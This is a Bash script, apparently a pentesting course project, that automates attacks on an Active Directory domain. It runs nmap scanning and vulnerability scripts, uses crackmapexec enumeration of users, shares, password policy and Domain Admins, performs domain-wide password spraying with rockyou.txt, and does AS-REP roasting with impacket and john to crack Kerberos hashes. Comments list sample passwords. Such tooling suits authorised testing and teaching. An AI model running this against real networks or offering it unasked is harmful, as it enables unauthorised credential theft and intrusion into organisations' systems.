#!bin/bash

sp=50 #Controling the speed of displaying contents of certain files 

#colors to color the text with:
RED='\033[0;31m'
GRE='\033[0;32m'
YEL='\033[0;33m'
BLU='\033[0;34m'
NC='\033[0m'

#ur (user file used):
	#ALEX
	#Yellow_King
	#Prince

#pswd (password file used):
	#Rambler12345!#
	#1adjd112ks20
	#ZZ00011111R()
	#Pullian99



exec > >(tee Report.txt) 2>&1

function ROOT_CHECK() #In order to execute the rest of the program, we must require Root permissions. This Function will check that we execute the SH file with Root permissions. If we didn't execute the SH file with Root permissions it will ask us for password and give us Root privileges.
{
    if [ "$(whoami)" != "root" ]; # Will use the whoami to check if the user executing the SH file does not have root privileges
		then
        echo -e "${RED}You are not Root. ${YEL}Attempting to give Root privileges...${NC}" #The colored text will light up to the user more
        sleep 3
        
        # Ask for sudo access
        sudo -v # -v flag for sudo is the command for requesting the root password in order to give root privileges
        if [ $? -ne 0 ]; then # ? is the state of the output either 0 if successful other another number if it fails. -ne 0 is stating the output was not equal to 0 and thus a failure.
            
            echo
            echo -e "${RED}Failed to obtain Root privileges. Exiting."
            echo
            
            sleep 3
            exit # exits the function due to failure to get the password correct
        fi

		echo -e "${GRE}root access granted!${NC}"
        sleep 3
    else
        echo -e "${GRE}You have Root permissions.${NC}"
        sleep 3
    fi
}
ROOT_CHECK

#1. Getting the User Input


function Picked_Network() {
	
	
		#1.1. Prompt the user to enter the target network range for scanning.
	
	echo
	read -p $'\e[33mWrite down the selected target\'s network range:\n\e[0m   ' NET_RANGE #Putting the target network range in a variable 
	echo
	
	 
	
	SAFE_NET_RANGE="${PROMPT_NET_RANGE//\//-}" #Replace the slash with a dash to make it a valid file name
	
	if [[ $NET_RANGE == *"/"* ]]; then #Confirms that the inputed Network Range has a / in order to be a network range #== and * requires [[ ]] 
	
	echo -e "${GRE}Confirmed input is a IP range"
	
	else
		echo -e "${RED}Failure! Exit Script." 
		exit 1
	fi
	
}

Picked_Network 

#1.2. Ask for the Domain name and Active Directory (AD) credentials.

function AD_Cred() {
	
#check for invisible characters and if empty spaces aren’t working
	
	

    read -p $'\e[33mEnter the name of the Domain (example: tuck.local):\e[0m \n' DOMAIN
    read -p $'\e[33mEnter the Username of the AD User:\e[0m\n' AD_USER
    read -p $'\e[33mEnter the Password of the AD User:\e[0m\n' AD_PASS

    echo -e "${BLU}Domain: $DOMAIN \nDomain User: $AD_USER \nDomain Password: $AD_PASS"
}

AD_Cred 



function CREATING_USER_LIST() { # Creating the User List for Exploitation
		
	read -p $'\e[33mEnter the file path of the user list file you want to use:\n\e[0m ' User_file_path  #Prompting for the file path
	
	
	User_file_path="$(realpath "$User_file_path" 2>/dev/null)"  #realpath returns the pathname
	
	echo
	echo -e "${GRE}User List created: $User_file_path"
	echo
}
CREATING_USER_LIST

#1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
function Pass_list() {

	read -p $'\e[33mWrite a path of a password list, if the input is empty the script will automatically pick rockyou.txt\n\e[0m ' PASSLIST
	echo
			
		if [ -z "$PASSLIST" ]; then
		
			PASSLIST=/usr/share/wordlists/rockyou.txt #Changes the value of PASSLIST to rockyou.txt if the variable is empty

		fi
		
		PASSLIST="$(realpath "$PASSLIST" 2>/dev/null)" #realpath returns the canonicalised absolute pathname

  
		echo -e "${GRE}The password list is: $PASSLIST"
		echo
		
#PASSLIST is the password list variable
}
Pass_list 


	
#2. Scanning Mode

	#2.1. Basic: Use the -Pn option in Nmap to assume all hosts are online, bypassing the discovery phase.
function Scanning_Hosts() { 
			
		echo
		echo -e "${YEL}Initiating BASIC scan of $NET_RANGE...${BLU}"  
		echo
	#Basic: Open_Scan_Output
		echo
		nmap $NET_RANGE -Pn -T4 --open > Open_Scan_Output #Will scan all the hosts with out pinging the hosts before scanning and check their open ports. Will send the output into Scan_Output
		pv -qL $sp Open_Scan_Output #Pipe Viewer to slow the output #-q quite mode so it doesn't show the progress bar, #-L is the rate limit #The reason we are using pv is because basic scan will be too fast for the user to go over
		echo 
	#LiveDevices
		echo
		echo -e "${YEL}BASIC SCAN: The list of live hosts on the $NET_RANGE network range:${BLU}" 
		echo
		cat Open_Scan_Output | grep "report for" | awk '{print $NF}' | tr -d '()' > Open_LiveDevices #tr -d '()' is done to remove all parentheses
		pv -qL $sp Open_LiveDevices 
		
		echo
		echo -e "${GRE}Basic Scan success ${NC}"  
		echo

} 



	#2.2. Intermediate: Scan all 65535 ports using the -p- flag.
function Scanning_-p-() {

	echo
	echo -e "${YEL}Initiating INTERMEDIATE scan of $NET_RANGE${BLU}"
	echo	

	#Intermediate: Scanning of each IP's TCP port
	
	for ip in $(cat Open_LiveDevices);  
		do nmap -p- -v "$ip" #Will scan all tcp ports out of the 65535 ports of each listed ip
	done
	
	echo
	echo -e "${GRE}Successful scan of all tcp ports ${NC}"  
	echo
}



#2.3. Advanced: Include UDP scanning for a thorough analysis.
function Scanning_UDP() {
	
	echo 
	echo -e "${YEL}Initiating ADVANCE scan of $NET_RANGE${BLU}"
	echo
	
	#Advance: Scanning of each IP's UDP port
	
	for ip in $(cat Open_LiveDevices); #Will also scan all UDP ports out of the 65535 ports of each listed ip
		do nmap -sU -p- -v -T5 "$ip" 
	 done 
	 
	echo
	echo -e "${GRE}Successful scan of all UDP ports ${NC}"  
	echo
}




#3. Enumeration Mode
	
	#3.1. Basic:

		#3.1.1. Identify services (-sV) running on open ports.
function Enum_Services() {
	
	echo	
	echo -e "${YEL}BASIC Enumeration: Identifying all services running on open ports on each of the live machines:${BLU}"
	echo
	
	for ip in $(cat Open_LiveDevices);  
		do nmap --open -sV "$ip" #Will enumerate the services of each live ip
	done
	
	echo
	echo -e "${GRE}Successful enumeration of services ${NC}"  
	echo
}

		#3.1.2. Identify the IP Address of the Domain Controller. 

function FIND_DC_IP() { #Looks for the domain controller that matches the domain given by the user in AD_Cred
   
   echo
   echo -e "${YEL}BASIC Enumeration: Enumerating for the Domain Controller in $NET_RANGE...${BLU}"
   echo   
   
    nmap -p 389 -Pn --open -sV "$NET_RANGE" | tee DC_LDAP_enum #389 port is ldap used by the domain controller 
        
    if [[ -z $(grep "$DOMAIN" DC_LDAP_enum) ]]; then #Checks if the Requested Domain is in the scan output
    
    echo
	echo "${RED}$DOMAIN not found in $NET_RANGE${NC}"
	echo
	
	else
	
	echo
	echo -e "${GRE}$DOMAIN found in the net range: $NET_RANGE\n${NC}"
	echo
	
	IP_FoundDC=$(cat DC_LDAP_enum | awk '/Nmap scan report/' | awk '{print $NF}' | tr -d '()')  #Creating a variable of the IP of the Domain controller. 
    Name_FoundDC=$(cat DC_LDAP_enum | grep "Service Info:"  | awk '{print $4}' | awk -F ';' '{print $1}') #The DC name
	Domain_FoundDC=$(cat DC_LDAP_enum | grep "Domain" | awk '{print $10}' | awk -F "," '{print$1}') #The DC's specific domain name   
	
	echo -e "${NC}Domain IP: $IP_FoundDC \n\nName of the Domain Controller: $Name_FoundDC \n\nName of the Domain on the Domain Controller: $Domain_FoundDC${NC}"
	echo
	
	fi
	
	echo
	echo -e "${GRE}Successful enumeration of the ip of domain Controller ${NC}"  
	echo
	
	#IP_FoundDC, Name_FoundDC, Domain_FoundDC are the info variables 
	#DC_LDAP_enum are the info file
}



		#3.1.3. Identify the IP Address of the DHCP server.
		
function FIND_DHCP_IP() { 
	
	echo
	echo -e "${YEL}BASIC Enumeration: Enumerating for the IP of the DHCP server...${BLU}"
	echo
	
	nmap "$DOMAIN" --script broadcast-dhcp-discover | tee DHCP_ip_Output	#Nmap script to discover the dhcp server
	
	cat DHCP_ip_Output | grep "Nmap scan report for" | awk '{print $6}'  > DHCPSERVERS
	
	echo
	echo -e "DHCP found servers: $(cat DHCPSERVERS)"
	echo
	
	echo
	echo -e "${GRE}Successful enumeration of the ip of the DHCP server ip ${NC}"  
	echo
	
		#DHCP_ip_Output, DHCPSERVERS are the info files 

}


	#3.2. Intermediate:

			#3.2.1. Enumerate IPs for key services: FTP, SSH, SMB, WinRM, LDAP, RDP.
function Key_Services() {
	
	echo
    echo -e "${YEL}INTERMEDIATE Enumeration: Enumerating the IP addresses on the network for key services(FTP, SSH, SMB, WinRM, LDAP, RDP) on the network of: $NET_RANGE...${BLU}"
    echo
    
	for ip in $(cat Open_LiveDevices); do
		echo -e "$ip" 
		nmap -p 21,22,139,389,636,5985,5986,3389,445 --open "$ip" | grep -E "PORT |/tcp |/udp |MAC Address"  #grep -E allows the ability to grep for mutiple other words
	done
	
	echo
	echo -e "${GRE} Successful enumeration of detecting key services on each ip on the $NET_RANGE ${NC}"  
	echo
}

			#3.2.2. Enumerate shared folders.
function Enumeration_Shared_Folders(){

#requires AD Credentials

	echo
	echo -e "${YEL}INTERMEDIATE Enumeration: Attempting to enumerate for shared folders...${BLU}"
	echo
	
	if [ -z "$DOMAIN" ] && [ -z "$AD_USER" ] && [ -z "$AD_PASS" ]; then 
		echo 
		echo -e "${RED}This Requires AD Credentials${BLU}"
		echo 
	
	else
		
		echo -e "${GRE}Credintals entered...${BLU}"
		echo
		echo "Shares:"
		echo

		crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --shares > Shared_Folders
		pv -qL $sp Shared_Folders
		
	fi
	
	echo
	echo -e "${GRE} Successful enumeration of the shared folders on the Domain Controller ${NC}"  
	echo
	
#Shared_Folders is the info file
}
			
			#3.2.3. Add three (3) NSE scripts you think can be relevant for enumerating domain networks.
function NSE_SCRIPTS() {
	
		
	echo
	echo -e "${YEL}INTERMEDIATE: Running NSE scripts on the discovered hosts...${BLU}"
	echo
		
		for ip in $(cat Open_LiveDevices); do
		
			echo -e "${YEL}$ip:" 
			echo
		
			echo -e "${NC}NSE Script: Initating the script that retrieves the LDAP root DSA-specific Entry:${BLU}"
			echo
			
			nmap -p 389 --script ldap-rootdse "$ip" #Retrieves the LDAP root DSA-specific Entry (DSE)
			
			echo
			echo -e "${NC}NSE Script: This script enumerates information from remote RDP services with CredSSP (NLA) authentication enabled.${BLU}"
			echo 
			
			nmap -p 3389 --script rdp-ntlm-info "$ip" #This script enumerates information from remote RDP services with CredSSP (NLA) authentication enabled. Extracting information like NetBIOS, DNS, and OS build version.

			echo
			echo -e "${NC}NSE Script: Attempting to obtain the current system date and the start date of a SMB2 server.${BLU}"
			echo 
			
			nmap -p 445 --script smb2-time "$ip" #Attempts to obtain the current system date and the start date of a SMB2 server.
			
			echo
			echo -e "${GRE}NSE scripts implemnted${NC}"  
			echo
	
			
		done
}

	#3.3. Advanced (Only if AD credentials were entered):	
	
		#Do not need to check if AD credentials were entered because AD credentials were required in #3.2.2. 
		
		#3.3.1. Extract all users.	
function User_Extraction() {
	
	echo 
	echo -e "${YEL}ADVANCE ENUMERATION: Extracting all the users from $DOMAIN through Domain Controller IP $IP_FoundDC ${NC}..."
	echo
	
	crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u"$AD_USER"  -p"$AD_PASS"  --users #--users is the flag that allows enumeration of the users on the domain 
	
	echo 
	echo -e "${GRE}Advance Enumeration Success!"
}

		#3.3.2. Extract all groups.
function Group_Extraction() {
	
	echo 
	echo -e "${YEL}ADVANCE ENUMERATION: Extracting all the groups from $DOMAIN through Domain Controller IP: $IP_FoundDC... ${NC}"
	echo 
		
	crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u"$AD_USER"  -p"$AD_PASS"  --groups 

	echo 
	echo -e "${GRE}Advance Enumeration Success!"
}
		
		#3.3.3. Extract all shares.
function Extract_All_Shares() {
    
    echo
    echo -e "${YEL}ADVANCED Enumeration: Extracting all accessible shares from the Domain Controller...${BLU}"
    echo
    
    echo -e "${YEL}Listing all shares...${NC}"
    smbclient -L "//$IP_FoundDC" -U "${DOMAIN}\\${AD_USER}%${AD_PASS}" | tee Shares_List 
	echo 
	
  
    echo
    echo -e "${YEL}Attempting to list files inside accessible shares...${BLU}"
    cat Shares_List | grep "Disk" | awk '{print $1}' | while read -r share_name; do #Filters for folders on the disk. awk print the row of Share Names. while loop that reads each line into a variable "share_name"
       
    echo   
       
	echo	
	echo -e  "${YEL}Enumerating //$IP_FoundDC/$share_name ...${BLU}"
	echo
	
	mkdir -p Extracted_Shares
        
	smbclient "//$IP_FoundDC/$share_name" -U "${DOMAIN}\\${AD_USER}%${AD_PASS}" -c "recurse; ls" > "Extracted_Shares/${share_name}_lst.txt" #-c "recurse; ls" Recursively list everything in the share
       
    done

    echo
    echo -e "${GRE}Share extraction complete!${NC}"
    echo
    
   #Extracted_Shares is the folder containing text files about the shares
   #Shares_List is the info file
    
}

		#3.3.4. Display password policy.
function Password_Policy() {

	echo
	echo -e "${YEL}ADVANCE enumeration: Extracting the Password Policy of the domain controller $IP_FoundDC...${BLU}"
	echo
		
	crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -X "Get-ADDefaultDomainPasswordPolicy" > Complete_Password_policy #Command to get the default password policy for the domain and save it into a file

	echo -e "${NC}The Password Policy of the domain $DOMAIN:\n\n$(cat Complete_Password_policy | awk 'NR>=6' | awk '{print $5, $6, $7}') ${BLU}" #list of the password policy spefic to the domain
	
	echo 
	echo -e "${GRE}Advance Enumeration Success!"


#Complete_Password_policy is the info file
}

		#3.3.5. Find disabled accounts.
function Disabled_Accounts() {

	echo
	echo -e "${YEL}ADVANCE enumeration Extracting all the Disabled users...${BLU}"
	echo 
	
	crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -x "powershell -Command \"Get-ADUser -Filter 'Enabled -eq \$false' -Properties Name,SamAccountName,Enabled \" " > fullinfo_ofdisabledaccounts #Command to list all Disabled Users in the domain and save it into a file

	

	echo -e "The list of disabled users on the domain $DOMAIN:${NC}\n\n$(cat fullinfo_ofdisabledaccounts | grep -w "Name" | awk '{print $NF}')" > list_of_disabled_accounts #Names of disabled accounts:
	pv -qL $sp list_of_disabled_accounts #Displays the list
	
	echo 
	echo -e "${GRE}Advance Enumeration Success!"

#list_of_disabled_accounts, fullinfo_ofdisabledaccounts are the info files

}

		#3.3.6. Find never-expired accounts.
function Enumerating_Never_Expired_Accounts() {
	
	echo
	echo -e "${YEL}ADVANCE enumeration Extracting all the users who's password will never expire...${BLU}"
	echo 
	
	crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -x "powershell -Command Get-ADUser -Filter * -Properties SamAccountName,Name,Enabled,PasswordNeverExpires" > fullinfo_NeverExpire #Command to list all users who's passwords will never expire in the domain and save it into a file


	echo -e "The list of never expiring password users on the domain $DOMAIN:\n\n$(cat fullinfo_NeverExpire | grep -w "Name" | awk '{print $NF}')" > list_of_NeverExpire #Names of accounts who's passwords will never expire:
	pv -qL $sp list_of_NeverExpire #Displays the list
	
	echo 
	echo -e "${GRE}Advance Enumeration Success!"

#fullinfo_NeverExpire, list_of_NeverExpire are info files
}

		#3.3.6. Find never-expired accounts.
function Enumerating_Domain_Admins() {
	
	echo
	echo -e "${YEL}ADVANCE enumeration Extracting all the users on the domain admin group..${BLU}"
	echo 
	
	crackmapexec smb "$IP_FoundDC" -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" -x "powershell -Command Get-ADGroupMember -Identity 'Domain Admins' -Recursive" > fullinfo_DomainGroup #Command to list all users in the domain's admin group and save it into a file
	
	echo -e "The list of users on the domain admin group in $DOMAIN:\n\n$(cat fullinfo_DomainGroup | grep -w "name" | awk '{print $NF}' | grep -v "SMB")" > list_of_DomainGroup #Names of accounts who's passwords will never expire:
	pv -qL $sp list_of_DomainGroup #Displays the list

	echo 
	echo -e "${GRE}Advance Enumeration Success!"

#fullinfo_DomainGroup, list_of_DomainGroup are the info files
}

#4. Exploitation Mode

	#4.1. Basic: Deploy the NSE vulnerability scanning script.
function Basic_Vulnerability_Exploit_Scan() {

	echo
	echo -e "${YEL}BASIC Exploitation: Executing Nmap Scripting Engine...${BLU}"
	echo

	nmap -v -sV --script=vuln "$NET_RANGE" #sV so we can use scripts. vuln is the vulnerability scanning script. We scan network for all hosts and all potential vulnerabilities in it. -v verbose mode

	echo
	echo -e "${GRE}Success implemntion of the Nmap Scripting Engine"
	echo 
}
#Basic_Vulnerability_Exploit_Scan | tee Exploit_Report.txt

	#4.2. Intermediate: Execute domain-wide password spraying to identify weak credentials.
function Brute_exploit() {
	
	echo
	echo -e "${YEL}INTERMEDIATE Brute forcing...${BLU}"
	echo
	
	crackmapexec smb $IP_FoundDC -u "$User_file_path" -p "$PASSLIST"  --continue-on-success | tee spraying_output
	
	echo
	echo -e "${YEL}Failed Attempts:${RED}" 
	echo
	cat spraying_output | grep "STATUS_LOGON_FAILURE" | awk '{print $6}' | awk -F ':' '{print $1, $2}' | awk -F '\' '{print $2}' #Gathers the usernames and passwords that failed
	
	echo
	echo -e "${YEL}Sucessful Attempts:${GRE}"
	echo
	cat spraying_output | grep -v "STATUS_LOGON_FAILURE" | awk '{print $6}' | awk -F ':' '{print $1, $2}' | awk -F '\' '{print $2}' #Gathers successful credintals

#spraying_output is the info file

}

	#4.3. Advanced: Extract and attempt to crack Kerberos tickets using pre-supplied passwords    

function Cracking_Kerberos_Tickets() {
	
		
	echo
	echo -e "${YEL}ADVANCE Exploitaion: Initiating the Kerberos Tickets(Note: The User list should include users that do not require Kerberos preauthentication): \nUser List file location:\n${NC}$User_file_path \n${YEL}Password file location:\n${NC}$PASSLIST ${BLU}"
	
	echo
	echo -e "Cracking Kerebos Tickets... ${BLU}"
	echo
	
	impacket-GetNPUsers $DOMAIN/ -usersfile "$User_file_path" -dc-ip $IP_FoundDC -outputfile roast_hashes  #We will get the AS-REP roast hashes from accounts that do not require Kerberos preauthentication
	cat roast_hashes | awk -F '$' '{print $4}' | awk -F ':' '{print $1}' > Cracked_Users  #The list of users and their domain that we found the roasts
	
	echo
	echo -e "${YEL}List of Users and their domains:${BLU}" 
	
	pv -qL $sp Cracked_Users
	
	echo 
	echo -e "${YEL}Cracked Kerberos Users: ${NC}" 
	echo
	john --wordlist=$PASSLIST roast_hashes > Cracked_Passwords 2>/dev/null
	cat Cracked_Passwords | awk 'NR > 1' | awk -F '$' '{print $1,$4}'  #Kerberos users we are able to crack

	#roast_hashes, Cracked_Users is a info file
	}

#1.4. Require the user to select a desired operation level (Basic, Intermediate, Advanced or None) for each mode: Scanning, Enumeration, Exploitation. Note: Selection of a higher level automatically encompasses the capabilities of the preceding levels. 
#Taken and added on from David Schiffman 
function Levels() {
	
	enumeration_done=0 #So when we execute Exploitation we don't repeat it Advance Enumeration
	
		## Scanning Functions
		basic_scanning() { 
			echo -e "${BLU}Performing Basic Scanning...${NC}"
			Scanning_Hosts
			}
		intermediate_scanning() { 
			basic_scanning 
			echo -e "${BLU}Performing Intermediate Scanning...${NC}"
			Scanning_-p-
			}
		advanced_scanning() { 
			intermediate_scanning
			echo -e "${BLU}Performing Advanced Scanning...${NC}"
			Scanning_UDP
			}

		## Enumeration Functions
		basic_enumeration() { 
			echo -e "${BLU}Performing Basic Enumeration...${NC}"
			Enum_Services 
			FIND_DC_IP 
			FIND_DHCP_IP
			}
		intermediate_enumeration() { 
			basic_enumeration 
			echo -e "${BLU}Performing Intermediate Enumeration...${NC}" 
			Key_Services 
			Enumeration_Shared_Folders
			NSE_SCRIPTS
			}
		advanced_enumeration() { 
			intermediate_enumeration 
			echo -e "${BLU}Performing Advanced Enumeration..${NC}"
			enumeration_done=1 #For making sure that Enumeration doesn't run twice when executing Exploitation
			User_Extraction
			Group_Extraction
			Extract_All_Shares
			Password_Policy
			Disabled_Accounts
			Enumerating_Never_Expired_Accounts
			Enumerating_Domain_Admins
			}
			
			ensure_enumeration_ran() { #ensure enumeration runs only once and before initating Advanced exploitation
				if [[ "$enumeration_done" -eq 0 ]]; then
					echo -e "${YEL}Enumeration has not been run yet running enumeration first...${NC}"
					advanced_enumeration				
				fi			
			}
			
		## Exploitation Functions
		basic_exploitation() { 
			ensure_enumeration_ran
			echo -e "${BLU}Performing Basic Exploitation...${NC}"
			Basic_Vulnerability_Exploit_Scan
			}
		intermediate_exploitation() { 
			basic_exploitation
			echo -e "${BLU}Performing Intermediate Exploitation...${NC}"
			Brute_exploit
			}
		advanced_exploitation() { 
			intermediate_exploitation
			echo -e "${BLU}Performing Advanced Exploitation...${NC}"
			Cracking_Kerberos_Tickets
			}

	#Get operation level from the user
	echo "Choose the operation level for each mode before any actions are executed."

	echo -e "${NC}0. None/Ignore: "
	echo "1. Basic: Scan all hosts in the network without pinging them"
	echo "2. Intermediate: Scan all TCP ports on each live device"
	echo -e "3. Advanced: Scan all UDP ports on each live device(${RED}Warning very noisy${NC})"

	echo

	read -p $'\e[33mSelect operation level for Scanning Mode (1-3):\e[32m ' scanning_choice

	echo

	echo -e "${NC}0. None/Ignore"
	echo "1. Basic: Identifying services and the IP addresses behind the DHCP server and the Domain Controller"
	echo "2. Intermediate: Enumerating for Key services, shared folders, and utlizination of NSE scripts: ldap-rootdse, rdp-ntlm-info, smb2-time"
	echo "3. Advanced(requires Credentials): Extracts all users, groups, shares, the password policy, disabled accounts as well ones that do not expire, and admin accounts"

	echo

	read -p $'\e[33mSelect operation level for Enumeration Mode (1-3):\e[32m ' enumeration_choice

	echo

	echo -e "${NC}Exploitation(requires Advance Enumeration): "
	echo "0. None/Ignore"
	echo "1. Basic: Uses the NSE vulnerability scanning script" #Requires Domain
	echo "2. Intermediate: domain-wide password spraying to identify weak credentials" #Requires Domain, AD User, AD Pass
	echo "3. Advanced: Attempt to crack Kerberos tickets using pre-supplied passwords"

	echo

	read -p $'\e[33mSelect operation level for Exploitation Mode (1-3):\e[32m ' exploitation_choice


	# Execute Scanning 
	case $scanning_choice in
		0) echo -e "${YEL}Ignoring/Passing Scanning...${NC}" ;;
		1) basic_scanning ;;
		2) intermediate_scanning  ;;
		3) advanced_scanning  ;;
		*) echo -e "${RED}Invalid Scanning choice. Exiting.${NC}"; exit 1 ;; #Incase they put a character thats not 0-3, exit 1 because the scipt can't fullfill its goal if an option 1-3 is not selected
	esac

	# Execute Enumeration
	case $enumeration_choice in
		0) echo -e "${YEL}Ignoring/Passing Enumeration...${NC}" ;;
		1) basic_enumeration 
		;;
		2) intermediate_enumeration 
		;;
		3) advanced_enumeration 
		;;
		*) echo -e "${RED}Invalid Enumeration choice. Exiting.${NC}"; exit 1 ;; #Incase they put a character thats not 0-3, exit 1 because the scipt can't fullfill its goal if an option 1-3 is not selected
	esac

	#Exploitation, will only run if Advanced Enumeration was executed
	# Execute Exploitation
	case $exploitation_choice in
		0) echo -e "${YEL}Ignoring/Passing Exploitation...${NC}" ;;
		1) basic_exploitation 
		;;
		2) intermediate_exploitation 
		;;
		3) advanced_exploitation 
		;;
		*) echo -e "${RED}Invalid Exploitation choice. Exiting.${NC}"; exit 1 ;; #Incase they put a character thats not 0-3, exit 1 because the scipt can't fullfill its goal if an option 1-3 is not selected
	esac
}
Levels



#Removing files from each mode

Scan_Files=(

	Open_Scan_Output 
	Open_LiveDevices
)

Enum_Files=(

	Open_Scan_Output
	Shared_Folders
	Shares_List
	Complete_Password_policy
	DC_LDAP_enum
	DHCP_ip_Output
	DHCPSERVERS
	Shared_Folders 
	Shares_List 
	Complete_Password_policy 
	list_of_disabled_accounts 
	fullinfo_ofdisabledaccounts  
	fullinfo_NeverExpire
	list_of_NeverExpire 
	fullinfo_DomainGroup 
	list_of_DomainGroup
)

Exploit_Files=(

	spraying_output
	roast_hashes
	Cracked_Users
)

rm -f "${Scan_Files[@]}" "${Enum_Files[@]}" "${Exploit_Files[@]}" #@ counts each line as its own array


#5. Results

	#5.1. For every execution, save the output in a PDF file.
	
function ToPDF() { #We will take the Report file, remove the colors and using pandoc convert them into a pdf file

#To convert the files into PDF we must first remove the colors through sed:
Color_Code="s/\x1B\[[0-9;]*m//g" #sed 'command'
	#s/ the subsitution and its delimiters
	#\x1B\[[0-9;]*m/ matches color escape codes
	#/g global                                                                                                                                  

	sed "$Color_Code" "Report.txt" > "clean_file"  #Gets rid of all the coloring variables                                  
	a2ps -o - "clean_file" | ps2pdf - "Report.pdf" #Creates a pdf file
                   
	echo -e "${GRE}PDF created!"
	
	rm -f "Report.txt" "clean_file" #Removing the files
}
ToPDF
